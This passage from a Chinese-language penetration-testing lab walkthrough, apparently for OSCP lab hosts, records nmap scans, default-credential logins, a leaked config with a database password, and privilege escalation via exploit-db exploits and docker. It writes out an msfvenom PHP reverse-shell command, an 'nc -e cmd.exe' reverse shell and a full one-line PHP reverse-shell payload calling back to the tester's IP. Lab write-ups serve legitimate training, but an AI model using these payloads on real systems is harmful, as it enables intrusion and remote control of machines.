class="line">OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: beta; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1518.61 seconds</span><br></pre></td></tr></table></figure></p>
<p>看到 james 第一時間就想到<br><a href="https://www.exploit-db.com/exploits/35513" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35513</a></p>
<p>和 HTB 的 SolidState<br><a href="https://deceiveyour.team/2018/01/27/hack-the-box-solid-state-walkthrough/" target="_blank" rel="noopener">https://deceiveyour.team/2018/01/27/hack-the-box-solid-state-walkthrough/</a><br><a href="https://0x00sec.org/t/htb-solidstate-write-up/5129" target="_blank" rel="noopener">https://0x00sec.org/t/htb-solidstate-write-up/5129</a><br>基本上是一模一樣，用 root/root 登入後把每個user的password重設<br><img src="https://i.imgur.com/B3M6JND.png" alt=""></p>
<p><img src="https://i.imgur.com/76d2obW.png" alt=""><br>發現了 ryuu的帳密(emu的過程就不演示了)</p>
<p>進去後 rbash<br><img src="https://i.imgur.com/KS1icia.png" alt=""><br><code>ssh -t /bin/bash</code> 無法<br><img src="https://i.imgur.com/4ZH0aBB.png" alt=""></p>
<p>上面的explitdb就派上用場了<br><img src="https://i.imgur.com/efRwd33.png" alt=""></p>
<p>把payload蓋過去<br><img src="https://i.imgur.com/1TBSNEj.png" alt=""></p>
<p><img src="https://i.imgur.com/yjnOH79.png" alt=""></p>
<p>送payload<br><img src="https://i.imgur.com/F5G0lJ2.png" alt=""></p>
<p>用ryuu登入後:<br><img src="https://i.imgur.com/KPsdk85.png" alt=""></p>
<p>這樣就拿到low bash shell了</p>
<p>uname:<br><code>Linux beta 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 i686 i386 GNU/Linux</code><br>對應的cve<br><a href="https://www.exploit-db.com/exploits/35161" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35161</a></p>
<p><img src="https://i.imgur.com/Evd5KAr.png" alt=""><br>WTF??</p>
<p>…記得先用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>拿到一個完整shell</p>
<p><img src="https://i.imgur.com/lL9MZ1L.png" alt=""></p>
<h2 id="10-11-1-73"><a href="#10-11-1-73" class="headerlink" title="10.11.1.73"></a>10.11.1.73</h2><p>nmap:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.73</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65514 filtered ports</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">554/tcp   open  rtsp?</span><br><span class="line">|_rtsp-methods: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">1100/tcp  open  java-rmi           Java RMI</span><br><span class="line">| rmi-dumpregistry: </span><br><span class="line">|   creamtec/ajaxswing/JVMFactory</span><br><span class="line">|     com.creamtec.ajaxswing.core.JVMFactory_Stub</span><br><span class="line">|     @10.11.1.73:49157</span><br><span class="line">|     extends</span><br><span class="line">|       java.rmi.server.RemoteStub</span><br><span class="line">|       extends</span><br><span class="line">|_        java.rmi.server.RemoteObject</span><br><span class="line">2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">3306/tcp  open  mysql              MySQL (unauthorized; French)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">|_ssl-date: 2020-02-28T18:37:38+00:00; -18m02s from scanner time.</span><br><span class="line">5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">5800/tcp  open  vnc-http           TightVNC (user: gamma; VNC TCP port: 5900)</span><br><span class="line">|_http-title: TightVNC desktop [gamma]</span><br><span class="line">5900/tcp  open  vnc                VNC (protocol 3.8)</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_vnc-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8014/tcp  open  http               Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: 404 Not Found</span><br><span class="line">8080/tcp  open  http               Apache httpd 2.4.9 ((Win32) PHP/5.5.12)</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/testmysql.php</span><br><span class="line">|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49157/tcp open  java-rmi           Java RMI</span><br><span class="line">49185/tcp open  java-rmi           Java RMI</span><br><span class="line">MAC Address: 00:50:56:B8:5B:FA (VMware)</span><br><span class="line">Service Info: Host: GAMMA; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h41m58s, deviation: 4h00m01s, median: -18m02s</span><br><span class="line">|_nbstat: NetBIOS name: GAMMA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b8:5b:fa (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: gamma</span><br><span class="line">|   NetBIOS computer name: GAMMA\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2020-02-28T10:36:24-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-28T18:36:26</span><br><span class="line">|_  start_date: 2018-10-23T01:51:1</span><br></pre></td></tr></table></figure></p>
<p>ms17-010打不進去 guest也是關的<br>rpc也沒鳥用<br>把注意力放在apache，8014顯示 not found<br>robots.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /testmysql.php</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /PHP/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgur.com/vkK1xv7.png" alt=""></p>
<p><img src="https://i.imgur.com/4jzT5PL.png" alt=""></p>
<p>這邊找了下<code>Ovidentia</code>預設帳密<br><a href="https://www.tmdhosting.com/kb/question/ovidentia-hosting-requirements-ovidentia-manual-installation/" target="_blank" rel="noopener">https://www.tmdhosting.com/kb/question/ovidentia-hosting-requirements-ovidentia-manual-installation/</a></p>
<p><a href="mailto:admin@admin.bab" target="_blank" rel="noopener">admin@admin.bab</a>/012345678 成功登入<br>進去admin panel之後花了好一陣子摸索<br>最後才發現原來<code>C:\wamp\www\PHP\upload</code>沒權限寫入<br>所以這邊要改<br><img src="https://i.imgur.com/b7pPay7.png" alt=""><br>我這邊改成<code>C:\wamp\www\test</code>之後儲存<br>這樣就可以創建資料夾並進行文件上傳了<br><img src="https://i.imgur.com/z3wJ8Qp.png" alt=""><br>還要記得條資料夾權限…(這邊都是我摸很久才摸出來的<br><img src="https://i.imgur.com/q2bhiJz.png" alt=""><br>更新完後右邊就多一個<code>File manager</code>了<br><img src="https://i.imgur.com/FChtY7q.png" alt=""><br>都準備好後我們就來產php reverse shell<br>因為是windows base, 所以pentestmonkey的不能用<br>我們這邊用msfveom產一個<br><code>msfvenom -p php/reverse_php lport=443 lhost=10.11.1.42</code><br>如果加<code>-b</code>的話就不是完整個php file了，而是eval的code<br><img src="https://i.imgur.com/DHdkqr3.png" alt=""><br>丟完之後我們去<code>http://10.11.1.73:8080/test</code><br>可以發現是index of了<br>摸索了一下最後找到我們的reverse shell<br><img src="https://i.imgur.com/tkbY2Rx.png" alt=""></p>
<p><img src="https://i.imgur.com/ySyXP2r.png" alt=""></p>
<p>但這個shell太醜了，所以我把<code>nc.exe</code>丟上去<br>再聽一個port 然後下<code>nc 10.11.0.42 1234 -e cmd.exe</code><br>過程就不演示了<br><img src="https://i.imgur.com/RJ9QMgg.png" alt=""><br>最後google發現了這個POC<br><a href="https://www.exploit-db.com/exploits/40564" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40564</a><br>好用!<br><img src="https://i.imgur.com/0uQVDuK.png" alt=""></p>
<p><img src="https://i.imgur.com/v8BiCgE.png" alt=""></p>
<h2 id="10-11-1-101"><a href="#10-11-1-101" class="headerlink" title="10.11.1.101"></a>10.11.1.101</h2><p>gobuster:<br><img src="https://i.imgur.com/8l6aydm.png" alt=""></p>
<p><code>http://10.11.1.101/passwords/alfred-pas.html#</code></p>
<p><img src="https://i.imgur.com/8o7E1Aq.png" alt=""></p>
<p>出生日期可以在 <code>Contact Us</code></p>
<p><img src="https://i.imgur.com/yCaMiVX.png" alt=""></p>
<p>輸入 1988 之後可以取得 ssh login credentials<br><img src="https://i.imgur.com/EQe1Bvc.png" alt=""></p>
<p>記得要 <code>-t bash</code> 不然會拿到受限制 shell<br><img src="https://i.imgur.com/mZo3A6u.png" alt=""></p>
<p>跑 LinEnum 之後發現有 docker<br>靠這個提權<br><a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/docker/</a></p>
<h2 id="10-11-1-115"><a href="#10-11-1-115" class="headerlink" title="10.11.1.115 (*)"></a>10.11.1.115 (*)</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.115</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 65524 closed ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         vsftpd 1.1.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxr-xr-x    2 0        0            4096 Feb 28  2003 pub</span><br><span class="line">22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 36:70:a4:9f:32:47:ac:57:3f:ef:a1:ec:0b:ba:44:1b (RSA1)</span><br><span class="line">|   1024 64:79:7d:c6:a2:63:32:54:f0:d9:2b:f3:5d:c7:d2:69 (DSA)</span><br><span class="line">|_  1024 48:fb:39:3d:30:82:50:de:66:69:c5:ca:45:62:c0:dc (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">25/tcp    open  smtp?</span><br><span class="line">|_smtp-commands: Couldn&apos;t establish connection on port 25</span><br><span class="line">80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.0.40 (Red Hat Linux)</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">143/tcp   open  imap        UW imapd 2001.315rh</span><br><span class="line">|_imap-capabilities: completed OK CAPABILITY THREAD=REFERENCES STARTTLS SORT MAILBOX-REFERRALS LOGIN-REFERRALS NAMESPACE SCAN IDLE MULTIAPPEND IMAP4REV1 THREAD=ORDEREDSUBJECT AUTH=LOGINA0001</span><br><span class="line">|_ssl-date: 2020-02-13T14:43:10+00:00; +11m47s from scanner time.</span><br><span class="line">199/tcp   open  smux        Linux SNMP multiplexer</span><br><span class="line">443/tcp   open  ssl/https   Apache/2.0.40 (Red Hat Linux)</span><br><span class="line">|_http-server-header: Apache/2.0.40 (Red Hat Linux)</span><br><span class="line">|_http-title: Bad request!</span><br><span class="line">|_ssl-date: 2020-02-13T14:42:46+00:00; +11m47s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">3306/tcp  open  mysql       MySQL (unauthorized)</span><br><span class="line">32768/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:50:56:B8:3D:02 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4.20</span><br><span class="line">OS details: Linux 2.4.20</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: tophat.acme.local; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 11m46s, deviation: 0s, median: 11m46s</span><br><span class="line">|_nbstat: NetBIOS name: TOPHAT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1980.18 seconds</span><br></pre></td></tr></table></figure></p>
<p>這題最後看解答是用<br><a href="https://www.exploit-db.com/exploits/7" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/7</a><br>解掉的</p>
<p>但我對perl不熟，不會用<br>於是換一個<br><a href="https://www.exploit-db.com/exploits/22469" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/22469</a></p>
<p><img src="https://i.imgur.com/dmcqzfG.png" alt=""></p>
<p>這題也是通靈…</p>
<p>因為nmap完全沒顯示出版本(我還特定再掃一次)</p>
<p>誰知道要用 samba 2.2.x 來打阿 </p>
<h2 id="10-11-1-116"><a href="#10-11-1-116" class="headerlink" title="10.11.1.116"></a>10.11.1.116</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.116</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 65529 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">21/tcp   open  ftp?</span><br><span class="line">22/tcp   open  ssh        OpenSSH 5.8p2_hpn13v11 (FreeBSD 20110503; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 75:e8:80:6f:6c:2f:d2:51:1a:d6:c9:9e:e4:a2:4c:2f (DSA)</span><br><span class="line">|   2048 28:43:26:62:1d:07:f9:e3:9f:0b:1a:94:98:1a:74:45 (RSA)</span><br><span class="line">|_  256 50:2f:db:dd:1a:8e:22:23:f8:dc:7b:65:c9:fc:8e:df (ECDSA)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.6 ((FreeBSD) PHP/5.4.23)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (FreeBSD) PHP/5.4.23</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">110/tcp  open  tcpwrapped</span><br><span class="line">143/tcp  open  tcpwrapped</span><br><span class="line">3306/tcp open  mysql      MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:B8:DD:B5 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: FreeBSD 9.X</span><br><span class="line">OS CPE: cpe:/o:freebsd:freebsd:9.0</span><br><span class="line">OS details: FreeBSD 9.0-RELEASE</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1338.78 seconds</span><br></pre></td></tr></table></figure></p>
<p>看不出什麼鳥</p>
<p>只有這個看起來很有意思</p>
<p><img src="https://i.imgur.com/OGGOxRb.png" alt=""></p>
<p>但頂多只用到LFI leak出 passwd和Config<br><a href="https://www.exploit-db.com/exploits/25971" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/25971</a></p>
<p><img src="https://i.imgur.com/vmEfvQQ.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	class Configuration&#123;</span><br><span class="line">		public $host = &quot;localhost&quot;;</span><br><span class="line">		public $db = &quot;cuppa&quot;;</span><br><span class="line">		public $user = &quot;root&quot;;</span><br><span class="line">		public $password = &quot;99bbVDdorGzfZJun&quot;;</span><br><span class="line">		public $table_prefix = &quot;cu_&quot;;</span><br><span class="line">		public $administrator_template = &quot;default&quot;;</span><br><span class="line">		public $list_limit = 25;</span><br><span class="line">		public $token = &quot;OBqIPqlFWf3X&quot;;</span><br><span class="line">		public $allowed_extensions = &quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;;</span><br><span class="line">		public $upload_default_path = &quot;media/uploadsFiles&quot;;</span><br><span class="line">		public $maximum_file_size = &quot;5242880&quot;;</span><br><span class="line">		public $secure_login = 0;</span><br><span class="line">		public $secure_login_value = &quot;&quot;;</span><br><span class="line">		public $secure_login_redirect = &quot;&quot;;</span><br><span class="line">	&#125; </span><br><span class="line">?&gt;r</span><br></pre></td></tr></table></figure>
<p>我們有mysql的root密碼，但mysql不允許我們的ip登入，且密碼也無法用於ssh登入</p>
<p>所以還是沒用</p>
<p>於是又用了 <code>nmap --script vuln -p80</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.116</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /administrator/: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /administrator/index.php: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /administrator/: Possible admin folder</span><br><span class="line">|   /administrator/index.php: Possible admin folder</span><br><span class="line">|   /db/: BlogWorx Database</span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|_  /db/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:50:56:B8:DD:B5 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 62.13 seconds</span><br></pre></td></tr></table></figure>
<p>有一個 <code>/db</code> 的 path</p>
<p>到底是第二個洞還是上傳點呢!?</p>
<p><img src="https://i.imgur.com/sLprxxH.png" alt=""></p>
<p>成功用密碼admin登入</p>
<p>exploitdb:<br><a href="https://www.exploit-db.com/exploits/24044" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/24044</a></p>
<p>照著裡面的影片做<br><a href="https://www.youtube.com/watch?v=G1i5oWblx9Q" target="_blank" rel="noopener">https://www.youtube.com/watch?v=G1i5oWblx9Q</a></p>
<p>但到了輸入php code這時候我們改一下</p>
<p><a href="https://forum.hackthebox.eu/discussion/300/nineveh-write-up-by-alamot" target="_blank" rel="noopener">https://forum.hackthebox.eu/discussion/300/nineveh-write-up-by-alamot</a></p>
<p>我們把php reverse shell 改成 one line</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = &quot;10.11.0.42&quot;; $port = 443; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &quot;uname -a; w; id; /bin/bash -i&quot;; $daemon = 0; $debug = 0; if (function_exists(&quot;pcntl_fork&quot;)) &#123; $pid = pcntl_fork(); if ($pid == -1) &#123; printit(&quot;ERROR: Cannot fork&quot;); exit(1); &#125; if ($pid) &#123; exit(0); &#125; if (posix_setsid() == -1) &#123; printit(&quot;Error: Cannot setsid()&quot;); exit(1); &#125; $daemon = 1; &#125; else &#123; printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;); &#125; chdir(&quot;/&quot;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) &#123; printit(&quot;$errstr ($errno)&quot;); exit(1); &#125; $descriptorspec = array(0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) &#123; printit(&quot;ERROR: Cannot spawn shell&quot;); exit(1); &#125; stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) &#123; if (feof($sock)) &#123; printit(&quot;ERROR: Shell connection terminated&quot;); break; &#125; if (feof($pipes[1])) &#123; printit(&quot;ERROR: Shell process terminated&quot;); break; &#125; $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) &#123; if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); &#125; if (in_array($pipes[1], $read_a)) &#123; if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); &#125; if (in_array($pipes[2], $read_a)) &#123; if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); &#125; &#125; fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) &#123;  if (!$daemon) &#123; print &quot;$string\n&quot;; &#125; &#125; ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/G4du06t.png" alt=""><br>(database的名字應該要shell.php才對)<br><img src="https://i.imgur.com/4OStvWA.png" alt=""></p>
